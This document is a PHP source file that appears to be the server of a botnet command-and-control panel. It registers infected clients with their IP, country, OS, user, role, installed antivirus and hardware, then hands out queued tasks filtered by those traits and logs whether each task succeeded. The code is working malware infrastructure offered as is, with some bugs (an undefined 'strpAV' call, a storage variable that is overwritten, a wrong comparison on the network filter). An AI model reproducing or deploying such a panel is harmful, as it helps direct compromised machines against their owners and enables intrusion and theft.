<?php
include('db.php');
date_default_timezone_set('Europe/Moscow');
$headers = getallheaders();
$currentDate = date('Y-m-d H:i:s');

// Connecting new client
if ( ($headers['mode'] == 'info') and (!clientExist()) ) {
	$clientInfo = json_decode(file_get_contents('php://input'), true);
	addNewClient($clientInfo);
	echo getTasks('On Connect');
}

// Connecting existing client
if ( ($headers['mode'] == 'knock') and (clientExist()) ){
	updateClient();
	echo getTasks('Every Client');
}

// Connecting client with task
if ( ($headers['mode'] == 'task') and (clientExist()) ){
	addTaskResult();
}

function getTasks($trigger) {
	global $pdo;
	$stmt = $pdo->prepare("SELECT * FROM `tasks` WHERE `trigger` = :trigger AND `status` = 'Active'");
	$stmt->bindParam(':trigger', $trigger);
	$stmt->execute();
	
	$tasks = array();
	$task = array();
	
	while ($task = $stmt->fetch(PDO::FETCH_ASSOC)) {
		if (!taskAlreadyCompleted($task['id'])) {
			if ( ($task['target'] == 'All') ) {
				$item = array('id' => strval($task['id']), 'type' => $task['type'],'content' => $task['content']);
				array_push($tasks, $item);
			} elseif ( (matchFilter($task)) ) {
				$item = array('id' => strval($task['id']), 'type' => $task['type'],'content' => $task['content']);
				array_push($tasks, $item);
			}
		}
	}
	return json_encode($tasks);
}

function getClientInfo() {
	global $headers;
	global $pdo;
	$stmt = $pdo->prepare("SELECT * FROM `clients` WHERE `uuid` = :uuid");
	$stmt->bindParam(':uuid', $headers['uuid']);
	$stmt->execute();
	$clientInfo = $stmt->fetch(PDO::FETCH_ORI_FIRST);
	return $clientInfo;
}

function updateClient() {
	global $headers;
	global $pdo;
	global $currentDate;
	$stmt = $pdo->prepare("UPDATE clients SET seen = :seen, version = :version WHERE `uuid` = :uuid");
	$stmt->bindParam(':seen', $currentDate);
	$stmt->bindParam(':version', $headers['version']);
	$stmt->bindParam(':uuid', $headers['uuid']);
	$stmt->execute();
}

function taskAlreadyCompleted($task_id) {
	global $headers;
	global $pdo;
	$stmt = $pdo->prepare("SELECT COUNT(*) FROM tasks_completed WHERE `task_id` = :task_id AND `client_uuid` = :client_uuid");
	$stmt->bindParam(':task_id', $task_id);
	$stmt->bindParam(':client_uuid', $headers['uuid']);
    $stmt->execute();
    
    $stmt2 = $pdo->prepare("SELECT COUNT(*) FROM tasks_failed WHERE `task_id` = :task_id AND `client_uuid` = :client_uuid");
    $stmt2->bindParam(':task_id', $task_id);
	$stmt2->bindParam(':client_uuid', $headers['uuid']);
	$stmt2->execute();
    
	$num = $stmt->fetchColumn();
    $num2 = $stmt2->fetchColumn();
	if (($num < 1) and ($num2 < 1))
		return false;
	else
		return true;
}

function addTaskResult() {
	global $headers;
	global $pdo;
	if ( ($headers['result'] == 'True') or ($headers['result'] == 1) ) {
		$stmt = $pdo->prepare("INSERT INTO tasks_completed (`task_id`, `client_uuid`, `details`) VALUES (:task_id, :client_uuid, :details)");
		$stmt2 = $pdo->prepare("UPDATE tasks SET total_done = total_done+1 WHERE id = :task_id");	
	} else {
		$stmt = $pdo->prepare("INSERT INTO tasks_failed (`task_id`, `client_uuid`, `details`) VALUES (:task_id, :client_uuid, :details)");
		$stmt2 = $pdo->prepare("UPDATE tasks SET total_failed = total_failed+1 WHERE id = :task_id");
	}
	$stmt->bindParam(':task_id', $headers['taskID']);
	$stmt->bindParam(':client_uuid', $headers['uuid']);
    $stmt->bindParam(':details', $headers['details']);
	$stmt->execute();
    
	$stmt2->bindParam(':task_id', $headers['taskID']);
	$stmt2->execute();
}

function addNewClient($clientInfo) {
	global $currentDate;
	global $pdo;
	try {
		$stmt = $pdo->prepare("INSERT INTO clients (`uuid`, `ip`, `location`, `os`, `user`, `role`, `antivirus`, `cpu`, `ram`, `storage`, `network`, `added`, `seen`, `version`) VALUES (:uuid, :ip, :country, :os, :user, :role, :antivirus, :cpu, :ram, :storage, :network, :added, :seen, :version)");
		$stmt->bindParam(':uuid', $clientInfo['uuid']);
		$stmt->bindParam(':ip', $clientInfo['ip']);
		$stmt->bindParam(':country', $clientInfo['location']);
		$stmt->bindParam(':os', $clientInfo['os']);
		$stmt->bindParam(':user', $clientInfo['user']);
		$stmt->bindParam(':role', $clientInfo['role']);
		$stmt->bindParam(':antivirus', $clientInfo['antivirus']);
		$stmt->bindParam(':cpu', $clientInfo['cpu']);
		$stmt->bindParam(':ram', $clientInfo['ram']);
		$stmt->bindParam(':storage', $clientInfo['storage']);
		$stmt->bindParam(':network', $clientInfo['network']);
		$stmt->bindParam(':added', $currentDate);
		$stmt->bindParam(':seen', $currentDate);
		$stmt->bindParam(':version', $clientInfo['version']);
		$stmt->execute();
	} catch(PDOException $e) {
		return ($e->getMessage());
	}
}

function getClientIP() {
	if (array_key_exists('HTTP_CLIENT_IP', $_SERVER))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if (array_key_exists('HTTP_X_FORWARDED', $_SERVER))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	else if (array_key_exists('HTTP_FORWARDED_FOR', $_SERVER))
		$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	else if (array_key_exists('HTTP_FORWARDED', $_SERVER))
		$ipaddress = $_SERVER['HTTP_FORWARDED'];
	else if (array_key_exists('REMOTE_ADDR', $_SERVER))
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	else
		$ipaddress = 'UNKNOWN';
	return $ipaddress;
}

function clientExist() {
	global $headers;
	global $pdo;
    $clientIP = getClientIP();
	$stmt = $pdo->prepare("SELECT COUNT(*) FROM `clients` WHERE `uuid` = :uuid OR `ip` = :ip");
	$stmt->bindParam(':uuid', $headers['uuid']);
    $stmt->bindParam(':ip', $clientIP);
	$stmt->execute();
	$num = $stmt->fetchColumn();
	if ($num < 1)
		return false;
	else
		return true;
}

function matchFilter($task) {
	global $headers;
	$clientInfo = getClientInfo();
	$match = array();
	$match['limit'] = false;
	$match['client_id'] = false;
	$match['location'] = false;
	$match['os'] = false;
	$match['antivirus'] = false;
	$match['storage'] = false;
	$match['network'] = false;
	$match['role'] = false;
	
	if ($task['limit'] != -1) {
		if ( intval($task['total_done']) < intval($task['limit']) ) {
            $match['limit'] = true;
        }
	} else { $match['limit'] = true; }
    
	if ($task['client_id'] != '-1') {
		if (strpos($task['client_id'],',') !== false) {
			$client_id = explode(",", $task['client_id']);
			foreach ($client_id as $id) {
				if (trim($id) == $clientInfo['id']) { $match['client_id'] = true; }
			}
		} else if (strpos($task['client_id'],'-') !== false) {
			$clientid = explode("-", $task['client_id']);
			if ( (intval($clientInfo['id']) >= intval($clientid[0])) and (intval($clientInfo['id']) <= intval($clientid[1])) )
				$match['client_id'] = true;
		} else {
			if (intval($clientInfo['id']) == intval($task['client_id'])) {
				$match['client_id'] = true;
			}
		}
	} else { $match['client_id'] = true; }

	if ($task['location'] != '-1') {
		if (strpos($task['location'],',') !== false) {
			$areas = explode(",", $task['location']);
			foreach ($areas as $area) {
				if (trim($area) == $clientInfo['location']) { $match['location'] = true; }
			}
		} else {
			if ($clientInfo['location'] == $task['location'])
				$match['location'] = true;
		}
	} else { $match['location'] = true; }

	if ($task['os'] != '-1') {
		if (strpos($task['os'],',') !== false) {
			$OSs = explode(",", $task['os']);
			foreach ($OSs as $OS) {
				if (strpos($clientInfo['os'],$OS) !== false) { $match['os'] = true; }
			}
		} else {
			if (strpos($clientInfo['os'],$task['os']) !== false)
				$match['os'] = true;
		}
	} else { $match['os'] = true; }
	
	if ($task['antivirus'] != '-1') {
		if (strpos($task['antivirus'],',') !== false) {
			$AVs = explode(",", $task['antivirus']);
			foreach ($AVs as $AV) {
				if (strpAV($clientInfo['antivirus'],$AV) !== false) { $match['antivirus'] = true; }
			}
		} else {
			if (strpos($clientInfo['antivirus'],$task['antivirus']) !== false) { $match['antivirus'] = true; }
		}
	} else { $match['antivirus'] = true; }
	
	if ($task['storage'] != '-1') {
        $clientStorage = explode(" / ", $task['storage']);
        $clientStorage = $clientStorage[1];
		$clientStorage = intval(str_replace(' GB','',$clientInfo['storage']));
		
		if (strpos($task['storage'],',') !== false) {
			$storage = explode(",", $task['storage']);
			foreach ($storage as $item) {
				if (intval(trim($item)) == $clientStorage) { 
					$match['storage'] = ($task['storage_type'] == 'Include') ? true : false;
				}
			}
		} else if (strpos($task['storage'],'-') !== false) {
			$storage = explode("-", $task['storage']);
			if ( ($clientStorage >= intval($storage[0])) and ($clientStorage <= intval($storage[1])) )
				$match['storage'] = ($task['storage_type'] == 'Include') ? true : false;
		} else {
			
			if ( $clientStorage == intval($task['storage']) )
				$match['storage'] = ($task['storage_type'] == 'Include') ? true : false;
		}
	} else { $match['storage'] = true; }
	
	if ($task['network'] != '-1') {
		$clientNetwork = intval($clientInfo['network']);
		
		if (strpos($task['network'],',') !== false) {
			$network = explode(",", $task['network']);
			foreach ($network as $item) {
				if (intval(trim($item)) == $clientNetwork) { 
					$match['network'] = ($task['network_type'] == 'Include') ? true : false;
				}
			}
		} else if (strpos($task['network'],'-') !== false) {
			$network = explode("-", $task['network']);
			if ( ($clientNetwork >= intval($network[0])) and ($clientNetwork <= intval($network[1])) )
				$match['network'] = ($task['network'] == 'Include') ? true : false;
		} else {
			if ( $clientNetwork == intval($task['network']) )
				$match['network'] = ($task['network_type'] == 'Include') ? true : false;
		}
	} else { $match['network'] = true; }

	if ($task['role'] != 'Any') {
		if ($task['role'] == $clientInfo['role']) { $match['role'] = true; }
	} else { $match['role'] = true; }
	
	foreach ($match as $item) {
		if ($item == false) {
			return false;
		}
	}
	return true;
}
?>